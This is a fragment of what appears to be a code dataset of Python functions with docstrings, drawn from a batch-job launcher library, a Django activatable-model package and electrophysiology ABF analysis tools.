            "def indexImages(folder,fname=\"index.html\"):\n    \"\"\"OBSOLETE WAY TO INDEX A FOLDER.\"\"\" #TODO: REMOVE\n    html=\"<html><body>\"\n    for item in glob.glob(folder+\"/*.*\"):\n        if item.split(\".\")[-1] in ['jpg','png']:\n            html+=\"<h3>%s</h3>\"%os.path.basename(item)\n            html+='<img src=\"%s\">'%os.path.basename(item)\n            html+='<br>'*10\n    html+=\"</html></body>\"\n    f=open(folder+\"/\"+fname,'w')\n    f.write(html)\n    f.close\n    print(\"indexed:\")\n    print(\"  \",os.path.abspath(folder+\"/\"+fname))\n    return"
        ],
        [
            "def save(self, *args, **kwargs):\n        \"\"\"\n        A custom save method that handles figuring out when something is activated or deactivated.\n        \"\"\"\n        current_activable_value = getattr(self, self.ACTIVATABLE_FIELD_NAME)\n        is_active_changed = self.id is None or self.__original_activatable_value != current_activable_value\n        self.__original_activatable_value = current_activable_value\n\n        ret_val = super(BaseActivatableModel, self).save(*args, **kwargs)\n\n        # Emit the signals for when the is_active flag is changed\n        if is_active_changed:\n            model_activations_changed.send(self.__class__, instance_ids=[self.id], is_active=current_activable_value)\n        if self.activatable_field_updated:\n            model_activations_updated.send(self.__class__, instance_ids=[self.id], is_active=current_activable_value)\n\n        return ret_val"
        ],
        [
            "def delete(self, force=False, **kwargs):\n        \"\"\"\n        It is impossible to delete an activatable model unless force is True. This function instead sets it to inactive.\n        \"\"\"\n        if force:\n            return super(BaseActivatableModel, self).delete(**kwargs)\n        else:\n            setattr(self, self.ACTIVATABLE_FIELD_NAME, False)\n            return self.save(update_fields=[self.ACTIVATABLE_FIELD_NAME])"
        ],
        [
            "def show(self, args, file_handle=None, **kwargs):\n        \"Write to file_handle if supplied, othewise print output\"\n        full_string = ''\n        info = {'root_directory':     '<root_directory>',\n                'batch_name':         '<batch_name>',\n                'batch_tag':          '<batch_tag>',\n                'batch_description':  '<batch_description>',\n                'launcher':        '<launcher>',\n                'timestamp_format':   '<timestamp_format>',\n                'timestamp':          tuple(time.localtime()),\n                'varying_keys':       args.varying_keys,\n                'constant_keys':      args.constant_keys,\n                'constant_items':     args.constant_items}\n\n        quoted_cmds = [ subprocess.list2cmdline(\n                [el for el in self(self._formatter(s),'<tid>',info)])\n                        for s in args.specs]\n\n        cmd_lines = ['%d: %s\\n' % (i, qcmds) for (i,qcmds)\n                     in enumerate(quoted_cmds)]\n        full_string += ''.join(cmd_lines)\n        if file_handle:\n            file_handle.write(full_string)\n            file_handle.flush()\n        else:\n            print(full_string)"
        ],
        [
            "def get_root_directory(self, timestamp=None):\n        \"\"\"\n        A helper method that supplies the root directory name given a\n        timestamp.\n        \"\"\"\n        if timestamp is None: timestamp = self.timestamp\n        if self.timestamp_format is not None:\n            root_name =  (time.strftime(self.timestamp_format, timestamp)\n                          + '-' + self.batch_name)\n        else:\n            root_name = self.batch_name\n\n        path = os.path.join(self.output_directory,\n                                *(self.subdir+[root_name]))\n        return os.path.abspath(path)"
        ],
        [
            "def _append_log(self, specs):\n        \"\"\"\n        The log contains the tids and corresponding specifications\n        used during launch with the specifications in JSON format.\n        \"\"\"\n        self._spec_log += specs # This should be removed\n        log_path = os.path.join(self.root_directory, (\"%s.log\" % self.batch_name))\n        core.Log.write_log(log_path, [spec for (_, spec) in specs], allow_append=True)"
        ],
        [
            "def _record_info(self, setup_info=None):\n        \"\"\"\n        All launchers should call this method to write the info file\n        at the end of the launch. The .info file is saved given\n        setup_info supplied by _setup_launch into the\n        root_directory. When called without setup_info, the existing\n        info file is updated with the end-time.\n        \"\"\"\n        info_path = os.path.join(self.root_directory, ('%s.info' % self.batch_name))\n\n        if setup_info is None:\n            try:\n                with open(info_path, 'r') as info_file:\n                    setup_info = json.load(info_file)\n            except:\n                setup_info = {}\n\n            setup_info.update({'end_time' : tuple(time.localtime())})\n        else:\n            setup_info.update({\n                'end_time' : None,\n                'metadata' : self.metadata\n                })\n\n        with open(info_path, 'w') as info_file:\n            json.dump(setup_info, info_file, sort_keys=True, indent=4)"
        ],
        [
            "def _launch_process_group(self, process_commands, streams_path):\n        \"\"\"\n        Launches processes defined by process_commands, but only\n        executes max_concurrency processes at a time; if a process\n        completes and there are still outstanding processes to be\n        executed, the next processes are run until max_concurrency is\n        reached again.\n        \"\"\"\n        processes = {}\n        def check_complete_processes(wait=False):\n            \"\"\"\n            Returns True if a process completed, False otherwise.\n            Optionally allows waiting for better performance (avoids\n            sleep-poll cycle if possible).\n            \"\"\"\n            result = False\n            # list creates copy of keys, as dict is modified in loop\n            for proc in list(processes):\n                if wait: proc.wait()\n                if proc.poll() is not None:\n                    # process is done, free up slot\n                    self.debug(\"Process %d exited with code %d.\"\n                               % (processes[proc]['tid'], proc.poll()))\n                    processes[proc]['stdout'].close()\n                    processes[proc]['stderr'].close()\n                    del processes[proc]\n                    result = True\n            return result\n\n        for cmd, tid in process_commands:\n            self.debug(\"Starting process %d...\" % tid)\n            job_timestamp = time.strftime('%H%M%S')\n            basename = \"%s_%s_tid_%d\" % (self.batch_name, job_timestamp, tid)\n            stdout_handle = open(os.path.join(streams_path, \"%s.o.%d\"\n                                              % (basename, tid)), \"wb\")\n            stderr_handle = open(os.path.join(streams_path, \"%s.e.%d\"\n                                              % (basename, tid)), \"wb\")\n            proc = subprocess.Popen(cmd, stdout=stdout_handle, stderr=stderr_handle)\n            processes[proc] = { 'tid' : tid,\n                                'stdout' : stdout_handle,\n                                'stderr' : stderr_handle }\n\n            if self.max_concurrency:\n                # max_concurrency reached, wait until more slots available\n                while len(processes) >= self.max_concurrency:\n                    if not check_complete_processes(len(processes)==1):\n                        time.sleep(0.1)\n\n        # Wait for all processes to complete\n        while len(processes) > 0:\n            if not check_complete_processes(True):\n                time.sleep(0.1)"
        ],
        [
            "def summary(self):\n        \"\"\"\n        A succinct summary of the Launcher configuration.  Unlike the\n        repr, a summary does not have to be complete but must supply\n        key information relevant to the user.\n        \"\"\"\n        print(\"Type: %s\" % self.__class__.__name__)\n        print(\"Batch Name: %r\" % self.batch_name)\n        if self.tag:\n            print(\"Tag: %s\" % self.tag)\n        print(\"Root directory: %r\" % self.get_root_directory())\n        print(\"Maximum concurrency: %s\" % self.max_concurrency)\n        if self.description:\n            print(\"Description: %s\" % self.description)"
        ],
        [
            "def _qsub_collate_and_launch(self, output_dir, error_dir, job_names):\n        \"\"\"\n        The method that actually runs qsub to invoke the python\n        process with the necessary commands to trigger the next\n        collation step and next block of jobs.\n        \"\"\"\n\n        job_name = \"%s_%s_collate_%d\" % (self.batch_name,\n                                         self.job_timestamp,\n                                         self.collate_count)\n\n        overrides = [(\"-e\",error_dir), ('-N',job_name), (\"-o\",output_dir),\n                     ('-hold_jid',','.join(job_names))]\n\n        resume_cmds =[\"import os, pickle, lancet\",\n                      (\"pickle_path = os.path.join(%r, 'qlauncher.pkl')\"\n                       % self.root_directory),\n                      \"launcher = pickle.load(open(pickle_path,'rb'))\",\n                      \"launcher.collate_and_launch()\"]\n\n        cmd_args = [self.command.executable,\n                    '-c', ';'.join(resume_cmds)]\n        popen_args = self._qsub_args(overrides, cmd_args)\n\n        p = subprocess.Popen(popen_args, stdout=subprocess.PIPE)\n        (stdout, stderr) = p.communicate()\n\n        self.debug(stdout)\n        if p.poll() != 0:\n            raise EnvironmentError(\"qsub command exit with code: %d\" % p.poll())\n\n        self.collate_count += 1\n        self.message(\"Invoked qsub for next batch.\")\n        return job_name"
        ],
        [
            "def _qsub_block(self, output_dir, error_dir, tid_specs):\n        \"\"\"\n        This method handles static argument specifiers and cases where\n        the dynamic specifiers cannot be queued before the arguments\n        are known.\n        \"\"\"\n        processes = []\n        job_names = []\n\n        for (tid, spec) in tid_specs:\n            job_name = \"%s_%s_tid_%d\" % (self.batch_name, self.job_timestamp, tid)\n            job_names.append(job_name)\n            cmd_args = self.command(\n                    self.command._formatter(spec),\n                    tid, self._launchinfo)\n\n            popen_args = self._qsub_args([(\"-e\",error_dir), ('-N',job_name), (\"-o\",output_dir)],\n                                        cmd_args)\n            p = subprocess.Popen(popen_args, stdout=subprocess.PIPE)\n            (stdout, stderr) = p.communicate()\n\n            self.debug(stdout)\n            if p.poll() != 0:\n                raise EnvironmentError(\"qsub command exit with code: %d\" % p.poll())\n\n            processes.append(p)\n\n        self.message(\"Invoked qsub for %d commands\" % len(processes))\n        if (self.reduction_fn is not None) or self.dynamic:\n            self._qsub_collate_and_launch(output_dir, error_dir, job_names)"
        ],
        [
            "def _launch_process_group(self, process_commands, streams_path):\n        \"\"\"\n        Aggregates all process_commands and the designated output files into a\n        list, and outputs it as JSON, after which the wrapper script is called.\n        \"\"\"\n        processes = []\n        for cmd, tid in process_commands:\n            job_timestamp = time.strftime('%H%M%S')\n            basename = \"%s_%s_tid_%d\" % (self.batch_name, job_timestamp, tid)\n            stdout_path = os.path.join(streams_path, \"%s.o.%d\" % (basename, tid))\n            stderr_path = os.path.join(streams_path, \"%s.e.%d\" % (basename, tid))\n            process = { 'tid' : tid,\n                        'cmd' : cmd,\n                        'stdout' : stdout_path,\n                        'stderr' : stderr_path }\n            processes.append(process)\n\n        # To make the JSON filename unique per group, we use the last tid in\n        # this group.\n        json_path = os.path.join(self.root_directory, self.json_name % (tid))\n        with open(json_path, 'w') as json_file:\n            json.dump(processes, json_file, sort_keys=True, indent=4)\n\n        p = subprocess.Popen([self.script_path, json_path, self.batch_name,\n                              str(len(processes)), str(self.max_concurrency)])\n        if p.wait() != 0:\n            raise EnvironmentError(\"Script command exit with code: %d\" % p.poll())"
        ],
        [
            "def cross_check_launchers(self, launchers):\n        \"\"\"\n        Performs consistency checks across all the launchers.\n        \"\"\"\n        if len(launchers) == 0: raise Exception('Empty launcher list')\n        timestamps = [launcher.timestamp for launcher in launchers]\n\n        if not all(timestamps[0] == tstamp for tstamp in timestamps):\n            raise Exception(\"Launcher timestamps not all equal. \"\n                            \"Consider setting timestamp explicitly.\")\n\n        root_directories = []\n        for launcher in launchers:\n            command = launcher.command\n            args = launcher.args\n            command.verify(args)\n            root_directory = launcher.get_root_directory()\n            if os.path.isdir(root_directory):\n                raise Exception(\"Root directory already exists: %r\" % root_directory)\n            if root_directory in root_directories:\n                raise Exception(\"Each launcher requires a unique root directory\")\n            root_directories.append(root_directory)"
        ],
        [
            "def _launch_all(self, launchers):\n        \"\"\"\n        Launches all available launchers.\n        \"\"\"\n        for launcher in launchers:\n            print(\"== Launching  %s ==\" % launcher.batch_name)\n            launcher()\n        return True"
        ],
        [
            "def _review_all(self, launchers):\n        \"\"\"\n        Runs the review process for all the launchers.\n        \"\"\"\n        # Run review of launch args if necessary\n        if self.launch_args is not None:\n            proceed = self.review_args(self.launch_args,\n                                       show_repr=True,\n                                       heading='Meta Arguments')\n            if not proceed: return False\n\n        reviewers = [self.review_args,\n                     self.review_command,\n                     self.review_launcher]\n\n        for (count, launcher) in enumerate(launchers):\n\n            # Run reviews for all launchers if desired...\n            if not all(reviewer(launcher) for reviewer in reviewers):\n                print(\"\\n == Aborting launch ==\")\n                return False\n            # But allow the user to skip these extra reviews\n            if len(launchers)!= 1 and count < len(launchers)-1:\n                skip_remaining = self.input_options(['Y', 'n','quit'],\n                                 '\\nSkip remaining reviews?', default='y')\n\n                if skip_remaining == 'y':          break\n                elif skip_remaining == 'quit':     return False\n\n        if self.input_options(['y','N'], 'Execute?', default='n') != 'y':\n            return False\n        else:\n            return self._launch_all(launchers)"
        ],
        [
            "def input_options(self, options, prompt='Select option', default=None):\n        \"\"\"\n        Helper to prompt the user for input on the commandline.\n        \"\"\"\n        check_options = [x.lower() for x in options]\n        while True:\n            response = input('%s [%s]: ' % (prompt, ', '.join(options))).lower()\n            if response in check_options: return response.strip()\n            elif response == '' and default is not None:\n                return default.lower().strip()"
        ],
        [
            "def save(self, filename,  metadata={}, **data):\n        \"\"\"\n        The implementation in the base class simply checks there is no\n        clash between the metadata and data keys.\n        \"\"\"\n        intersection = set(metadata.keys()) & set(data.keys())\n        if intersection:\n            msg = 'Key(s) overlap between data and metadata: %s'\n            raise Exception(msg  % ','.join(intersection))"
        ],
        [
            "def _savepath(self, filename):\n        \"\"\"\n        Returns the full path for saving the file, adding an extension\n        and making the filename unique as necessary.\n        \"\"\"\n        (basename, ext) = os.path.splitext(filename)\n        basename = basename if (ext in self.extensions) else filename\n        ext = ext if (ext in self.extensions) else self.extensions[0]\n        savepath = os.path.abspath(os.path.join(self.directory,\n                                                 '%s%s' % (basename, ext)))\n        return (tempfile.mkstemp(ext, basename + \"_\", self.directory)[1]\n                if self.hash_suffix else savepath)"
        ],
        [
            "def file_supported(cls, filename):\n        \"\"\"\n        Returns a boolean indicating whether the filename has an\n        appropriate extension for this class.\n        \"\"\"\n        if not isinstance(filename, str):\n            return False\n        (_, ext) = os.path.splitext(filename)\n        if ext not in cls.extensions:\n            return False\n        else:\n            return True"
        ],
        [
            "def save(self, filename, imdata, **data):\n        \"\"\"\n        Data may be either a PIL Image object or a Numpy array.\n        \"\"\"\n        if isinstance(imdata, numpy.ndarray):\n            imdata = Image.fromarray(numpy.uint8(imdata))\n        elif isinstance(imdata, Image.Image):\n            imdata.save(self._savepath(filename))"
        ],
        [
            "def fileModifiedTimestamp(fname):\r\n    \"\"\"return \"YYYY-MM-DD\" when the file was modified.\"\"\"\r\n    modifiedTime=os.path.getmtime(fname)\r\n    stamp=time.strftime('%Y-%m-%d', time.localtime(modifiedTime))\r\n    return stamp"
        ],
        [
            "def loadResults(resultsFile):\r\n    \"\"\"returns a dict of active folders with days as keys.\"\"\"\r\n    with open(resultsFile) as f:\r\n        raw=f.read().split(\"\\n\")\r\n    foldersByDay={}\r\n    for line in raw:\r\n        folder=line.split('\"')[1]+\"\\\\\"\r\n        line=[]+line.split('\"')[2].split(\", \")\r\n        for day in line[1:]:\r\n            if not day in foldersByDay:\r\n                foldersByDay[day]=[]\r\n            foldersByDay[day]=foldersByDay[day]+[folder]\r\n    nActiveDays=len(foldersByDay)\r\n    dayFirst=sorted(foldersByDay.keys())[0]\r\n    dayLast=sorted(foldersByDay.keys())[-1]\r\n    dayFirst=datetime.datetime.strptime(dayFirst, \"%Y-%m-%d\" )\r\n    dayLast=datetime.datetime.strptime(dayLast, \"%Y-%m-%d\" )\r\n    nDays = (dayLast - dayFirst).days + 1\r\n    emptyDays=0\r\n    for deltaDays in range(nDays):\r\n        day=dayFirst+datetime.timedelta(days=deltaDays)\r\n        stamp=datetime.datetime.strftime(day, \"%Y-%m-%d\" )\r\n        if not stamp in foldersByDay:\r\n            foldersByDay[stamp]=[]\r\n            emptyDays+=1\r\n    percActive=nActiveDays/nDays*100\r\n    print(\"%d of %d days were active (%.02f%%)\"%(nActiveDays,nDays,percActive))\r\n    return foldersByDay"
        ],
        [
            "def ndist(data,Xs):\n    \"\"\"\n    given some data and a list of X posistions, return the normal\n    distribution curve as a Y point at each of those Xs.\n    \"\"\"\n    sigma=np.sqrt(np.var(data))\n    center=np.average(data)\n    curve=mlab.normpdf(Xs,center,sigma)\n    curve*=len(data)*HIST_RESOLUTION\n    return curve"
        ],
        [
            "def abfinfo(self,printToo=False,returnDict=False):\n        \"\"\"show basic info about ABF class variables.\"\"\"\n        info=\"\\n### ABF INFO ###\\n\"\n        d={}\n        for thingName in sorted(dir(self)):\n            if thingName in ['cm','evIs','colormap','dataX','dataY',\n                             'protoX','protoY']:\n                continue\n            if \"_\" in thingName:\n                continue\n            thing=getattr(self,thingName)\n            if type(thing) is list and len(thing)>5:\n                continue\n            thingType=str(type(thing)).split(\"'\")[1]\n            if \"method\" in thingType or \"neo.\" in thingType:\n                continue\n            if thingName in [\"header\",\"MT\"]:\n                continue\n            info+=\"%s <%s> %s\\n\"%(thingName,thingType,thing)\n            d[thingName]=thing\n        if printToo:\n            print()\n            for line in info.split(\"\\n\"):\n                if len(line)<3:\n                    continue\n                print(\"   \",line)\n            print()\n        if returnDict:\n            return d\n        return info"
        ],
        [
            "def headerHTML(self,fname=None):\n        \"\"\"read the ABF header and save it HTML formatted.\"\"\"\n        if fname is None:\n            fname = self.fname.replace(\".abf\",\"_header.html\")\n        html=\"<html><body><code>\"\n        html+=\"<h2>abfinfo() for %s.abf</h2>\"%self.ID\n        html+=self.abfinfo().replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").replace(\"\\n\",\"<br>\")\n        html+=\"<h2>Header for %s.abf</h2>\"%self.ID\n        html+=pprint.pformat(self.header, indent=1)\n        html=html.replace(\"\\n\",'<br>').replace(\" \",\"&nbsp;\")\n        html=html.replace(r\"\\x00\",\"\")\n        html+=\"</code></body></html>\"\n        print(\"WRITING HEADER TO:\")\n        print(fname)\n        f=open(fname,'w')\n        f.write(html)\n        f.close()"
        ],
        [
            "def generate_colormap(self,colormap=None,reverse=False):\n        \"\"\"use 1 colormap for the whole abf. You can change it!.\"\"\"\n        if colormap is None:\n            colormap = pylab.cm.Dark2\n        self.cm=colormap\n        self.colormap=[]\n        for i in range(self.sweeps): #TODO: make this the only colormap\n            self.colormap.append(colormap(i/self.sweeps))\n        if reverse:\n            self.colormap.reverse()"
        ],
        [
            "def get_data_around(self,timePoints,thisSweep=False,padding=0.02,msDeriv=0):\n        \"\"\"\n        return self.dataY around a time point. All units are seconds.\n        if thisSweep==False, the time point is considered to be experiment time\n            and an appropriate sweep may be selected. i.e., with 10 second\n            sweeps and timePint=35, will select the 5s mark of the third sweep\n        \"\"\"\n        if not np.array(timePoints).shape:\n            timePoints=[float(timePoints)]\n        data=None\n        for timePoint in timePoints:\n            if thisSweep:\n                sweep=self.currentSweep\n            else:\n                sweep=int(timePoint/self.sweepInterval)\n                timePoint=timePoint-sweep*self.sweepInterval\n            self.setSweep(sweep)\n            if msDeriv:\n                dx=int(msDeriv*self.rate/1000) #points per ms\n                newData=(self.dataY[dx:]-self.dataY[:-dx])*self.rate/1000/dx\n            else:\n                newData=self.dataY\n            padPoints=int(padding*self.rate)\n            pad=np.empty(padPoints)*np.nan\n            Ic=timePoint*self.rate #center point (I)\n            newData=np.concatenate((pad,pad,newData,pad,pad))\n            Ic+=padPoints*2\n            newData=newData[Ic-padPoints:Ic+padPoints]\n            newData=newData[:int(padPoints*2)] #TODO: omg so much trouble with this!\n            if data is None:\n                data=[newData]\n            else:\n                data=np.vstack((data,newData))#TODO: omg so much trouble with this!\n        return data"
        ],
        [
            "def filter_gaussian(self,sigmaMs=100,applyFiltered=False,applyBaseline=False):\n        \"\"\"RETURNS filtered trace. Desn't filter it in place.\"\"\"\n        if sigmaMs==0:\n            return self.dataY\n        filtered=cm.filter_gaussian(self.dataY,sigmaMs)\n        if applyBaseline:\n            self.dataY=self.dataY-filtered\n        elif applyFiltered:\n            self.dataY=filtered\n        else:\n            return filtered"
        ],
        [
            "def validate_activatable_models():\n    \"\"\"\n    Raises a ValidationError for any ActivatableModel that has ForeignKeys or OneToOneFields that will\n    cause cascading deletions to occur. This function also raises a ValidationError if the activatable\n    model has not defined a Boolean field with the field name defined by the ACTIVATABLE_FIELD_NAME variable\n    on the model.\n    \"\"\"\n    for model in get_activatable_models():\n        # Verify the activatable model has an activatable boolean field\n        activatable_field = next((\n            f for f in model._meta.fields\n            if f.__class__ == models.BooleanField and f.name == model.ACTIVATABLE_FIELD_NAME\n        ), None)\n        if activatable_field is None:\n            raise ValidationError((\n                'Model {0} is an activatable model. It must define an activatable BooleanField that '\n                'has a field name of model.ACTIVATABLE_FIELD_NAME (which defaults to is_active)'.format(model)\n            ))\n\n        # Ensure all foreign keys and onetoone fields will not result in cascade deletions if not cascade deletable\n        if not model.ALLOW_CASCADE_DELETE:\n            for field in model._meta.fields:\n                if field.__class__ in (models.ForeignKey, models.OneToOneField):\n                    if field.remote_field.on_delete == models.CASCADE:\n                        raise ValidationError((\n                            'Model {0} is an activatable model. All ForeignKey and OneToOneFields '\n                            'must set on_delete methods to something other than CASCADE (the default). '\n                            'If you want to explicitely allow cascade deletes, then you must set the '\n                            'ALLOW_CASCADE_DELETE=True class variable on your model.'\n                        ).format(model))"
        ],
        [
            "def to_table(args, vdims=[]):\n    \"Helper function to convet an Args object to a HoloViews Table\"\n    if not Table:\n        return \"HoloViews Table not available\"\n    kdims = [dim for dim in args.constant_keys + args.varying_keys\n             if dim not in vdims]\n    items = [tuple([spec[k] for k in kdims+vdims])\n             for spec in args.specs]\n    return Table(items, kdims=kdims, vdims=vdims)"
        ],
        [
            "def pprint_args(self, pos_args, keyword_args, infix_operator=None, extra_params={}):\n        \"\"\"\n        Method to define the positional arguments and keyword order\n        for pretty printing.\n        \"\"\"\n        if infix_operator and not (len(pos_args)==2 and keyword_args==[]):\n            raise Exception('Infix format requires exactly two'\n                            ' positional arguments and no keywords')\n        (kwargs,_,_,_) = self._pprint_args\n        self._pprint_args = (keyword_args + kwargs, pos_args, infix_operator, extra_params)"
        ],
        [
            "def spec_formatter(cls, spec):\n        \" Formats the elements of an argument set appropriately\"\n        return type(spec)((k, str(v)) for (k,v) in spec.items())"
        ],
        [
            "def _collect_by_key(self,specs):\n        \"\"\"\n        Returns a dictionary like object with the lists of values\n        collapsed by their respective key. Useful to find varying vs\n        constant keys and to find how fast keys vary.\n        \"\"\"\n        # Collect (key, value) tuples as list of lists, flatten with chain\n        allkeys = itertools.chain.from_iterable(\n            [[(k, run[k]) for k in run] for run in specs])\n        collection = defaultdict(list)\n        for (k,v) in allkeys: collection[k].append(v)\n        return collection"
        ],
        [
            "def summary(self):\n        \"\"\"\n        A succinct summary of the argument specifier. Unlike the repr,\n        a summary does not have to be complete but must supply the\n        most relevant information about the object to the user.\n        \"\"\"\n        print(\"Items: %s\" % len(self))\n        varying_keys = ', '.join('%r' % k for k in self.varying_keys)\n        print(\"Varying Keys: %s\" % varying_keys)\n        items = ', '.join(['%s=%r' % (k,v)\n                           for (k,v) in self.constant_items])\n        if self.constant_items:\n            print(\"Constant Items: %s\" % items)"
        ],
        [
            "def _build_specs(self, specs, kwargs, fp_precision):\n        \"\"\"\n        Returns the specs, the remaining kwargs and whether or not the\n        constructor was called with kwarg or explicit specs.\n        \"\"\"\n        if specs is None:\n            overrides = param.ParamOverrides(self, kwargs,\n                                             allow_extra_keywords=True)\n            extra_kwargs = overrides.extra_keywords()\n            kwargs = dict([(k,v) for (k,v) in kwargs.items()\n                           if k not in extra_kwargs])\n            rounded_specs = list(self.round_floats([extra_kwargs],\n                                                   fp_precision))\n\n            if extra_kwargs=={}: return [], kwargs, True\n            else:                return rounded_specs, kwargs, False\n\n        return list(self.round_floats(specs, fp_precision)), kwargs, True"
        ],
        [
            "def show(self, exclude=[]):\n        \"\"\"\n        Convenience method to inspect the available argument values in\n        human-readable format. The ordering of keys is determined by\n        how quickly they vary.\n\n        The exclude list allows specific keys to be excluded for\n        readability (e.g. to hide long, absolute filenames).\n        \"\"\"\n        ordering = self.constant_keys + self.varying_keys\n        spec_lines = [', '.join(['%s=%s' % (k, s[k]) for k in ordering\n                                 if (k in s) and (k not in exclude)])\n                      for s in self.specs]\n        print('\\n'.join(['%d: %s' % (i,l) for (i,l) in enumerate(spec_lines)]))"
        ],
        [
            "def lexsort(self, *order):\n        \"\"\"\n        The lexical sort order is specified by a list of string\n        arguments. Each string is a key name prefixed by '+' or '-'\n        for ascending and descending sort respectively. If the key is\n        not found in the operand's set of varying keys, it is ignored.\n        \"\"\"\n        if order == []:\n            raise Exception(\"Please specify the keys for sorting, use\"\n                            \"'+' prefix for ascending,\"\n                            \"'-' for descending.)\")\n\n        if not set(el[1:] for el in order).issubset(set(self.varying_keys)):\n            raise Exception(\"Key(s) specified not in the set of varying keys.\")\n\n        sorted_args = copy.deepcopy(self)\n        specs_param = sorted_args.params('specs')\n        specs_param.constant = False\n        sorted_args.specs = self._lexsorted_specs(order)\n        specs_param.constant = True\n        sorted_args._lexorder = order\n        return sorted_args"
        ],
        [
            "def linspace(self, start, stop, n):\n        \"\"\" Simple replacement for numpy linspace\"\"\"\n        if n == 1: return [start]\n        L = [0.0] * n\n        nm1 = n - 1\n        nm1inv = 1.0 / nm1\n        for i in range(n):\n            L[i] = nm1inv * (start*(nm1 - i) + stop*i)\n        return L"
        ],
        [
            "def extract_log(log_path, dict_type=dict):\n        \"\"\"\n        Parses the log file generated by a launcher and returns\n        dictionary with tid keys and specification values.\n\n        Ordering can be maintained by setting dict_type to the\n        appropriate constructor (i.e. OrderedDict). Keys are converted\n        from unicode to strings for kwarg use.\n        \"\"\"\n        log_path = (log_path if os.path.isfile(log_path)\n                    else os.path.join(os.getcwd(), log_path))\n        with open(log_path,'r') as log:\n            splits = (line.split() for line in log)\n            uzipped = ((int(split[0]), json.loads(\" \".join(split[1:]))) for split in splits)\n            szipped = [(i, dict((str(k),v) for (k,v) in d.items())) for (i,d) in uzipped]\n        return dict_type(szipped)"
        ],
        [
            "def write_log(log_path, data, allow_append=True):\n        \"\"\"\n        Writes the supplied specifications to the log path. The data\n        may be supplied as either as a an Args or as a list of\n        dictionaries.\n\n        By default, specifications will be appropriately appended to\n        an existing log file. This can be disabled by setting\n        allow_append to False.\n        \"\"\"\n        append = os.path.isfile(log_path)\n        islist = isinstance(data, list)\n\n        if append and not allow_append:\n            raise Exception('Appending has been disabled'\n                            ' and file %s exists' % log_path)\n\n        if not (islist or isinstance(data, Args)):\n            raise Exception('Can only write Args objects or dictionary'\n                            ' lists to log file.')\n\n        specs = data if islist else data.specs\n        if not all(isinstance(el,dict) for el in specs):\n            raise Exception('List elements must be dictionaries.')\n\n        log_file = open(log_path, 'r+') if append else open(log_path, 'w')\n        start = int(log_file.readlines()[-1].split()[0])+1 if append else 0\n        ascending_indices = range(start, start+len(data))\n\n        log_str = '\\n'.join(['%d %s' % (tid, json.dumps(el))\n                             for (tid, el) in zip(ascending_indices,specs)])\n        log_file.write(\"\\n\"+log_str if append else log_str)\n        log_file.close()"
        ],
        [
            "def directory(cls, directory, root=None, extension=None, **kwargs):\n        \"\"\"\n        Load all the files in a given directory selecting only files\n        with the given extension if specified. The given kwargs are\n        passed through to the normal constructor.\n        \"\"\"\n        root = os.getcwd() if root is None else root\n        suffix = '' if extension is None else '.' + extension.rsplit('.')[-1]\n        pattern = directory + os.sep + '*' + suffix\n        key = os.path.join(root, directory,'*').rsplit(os.sep)[-2]\n        format_parse = list(string.Formatter().parse(key))\n        if not all([el is None for el in zip(*format_parse)[1]]):\n            raise Exception('Directory cannot contain format field specifications')\n        return cls(key, pattern, root, **kwargs)"
        ],
        [
            "def fields(self):\n        \"\"\"\n        Return the fields specified in the pattern using Python's\n        formatting mini-language.\n        \"\"\"\n        parse = list(string.Formatter().parse(self.pattern))\n        return [f for f in zip(*parse)[1] if f is not None]"
        ],
        [
            "def _load_expansion(self, key, root, pattern):\n        \"\"\"\n        Loads the files that match the given pattern.\n        \"\"\"\n        path_pattern = os.path.join(root, pattern)\n        expanded_paths = self._expand_pattern(path_pattern)\n\n        specs=[]\n        for (path, tags) in expanded_paths:\n            filelist = [os.path.join(path,f) for f in os.listdir(path)] if os.path.isdir(path) else [path]\n            for filepath in filelist:\n                specs.append(dict(tags,**{key:os.path.abspath(filepath)}))\n\n        return sorted(specs, key=lambda s: s[key])"
        ],
        [
            "def _expand_pattern(self, pattern):\n        \"\"\"\n        From the pattern decomposition, finds the absolute paths\n        matching the pattern.\n        \"\"\"\n        (globpattern, regexp, fields, types) = self._decompose_pattern(pattern)\n        filelist = glob.glob(globpattern)\n        expansion = []\n\n        for fname in filelist:\n            if fields == []:\n                expansion.append((fname, {}))\n                continue\n            match = re.match(regexp, fname)\n            if match is None: continue\n            match_items = match.groupdict().items()\n            tags = dict((k,types.get(k, str)(v)) for (k,v) in match_items)\n            expansion.append((fname, tags))\n\n        return expansion"
        ],
        [
            "def from_pattern(cls, pattern, filetype=None, key='filename', root=None, ignore=[]):\n        \"\"\"\n        Convenience method to directly chain a pattern processed by\n        FilePattern into a FileInfo instance.\n\n        Note that if a default filetype has been set on FileInfo, the\n        filetype argument may be omitted.\n        \"\"\"\n        filepattern = FilePattern(key, pattern, root=root)\n        if FileInfo.filetype and filetype is None:\n            filetype = FileInfo.filetype\n        elif filetype is None:\n            raise Exception(\"The filetype argument must be supplied unless \"\n                            \"an appropriate default has been specified as \"\n                            \"FileInfo.filetype\")\n        return FileInfo(filepattern, key, filetype, ignore=ignore)"
        ],
        [
            "def load_table(self, table):\n        \"\"\"\n        Load the file contents into the supplied Table using the\n        specified key and filetype. The input table should have the\n        filenames as values which will be replaced by the loaded\n        data. If data_key is specified, this key will be used to index\n        the loaded data to retrive the specified item.\n        \"\"\"\n        items,  data_keys = [], None\n        for key, filename in table.items():\n            data_dict = self.filetype.data(filename[0])\n            current_keys = tuple(sorted(data_dict.keys()))\n            values = [data_dict[k] for k in current_keys]\n            if data_keys is None:\n                data_keys = current_keys\n            elif data_keys != current_keys:\n                raise Exception(\"Data keys are inconsistent\")\n            items.append((key, values))\n\n        return Table(items, kdims=table.kdims, vdims=data_keys)"
        ],
        [
            "def load_dframe(self, dframe):\n        \"\"\"\n        Load the file contents into the supplied dataframe using the\n        specified key and filetype.\n        \"\"\"\n        filename_series = dframe[self.key]\n        loaded_data = filename_series.map(self.filetype.data)\n        keys = [list(el.keys()) for el in loaded_data.values]\n        for key in set().union(*keys):\n            key_exists = key in dframe.columns\n            if key_exists:\n                self.warning(\"Appending '_data' suffix to data key %r to avoid\"\n                             \"overwriting existing metadata with the same name.\" % key)\n            suffix = '_data' if key_exists else ''\n            dframe[key+suffix] = loaded_data.map(lambda x: x.get(key, np.nan))\n        return dframe"
        ],
        [
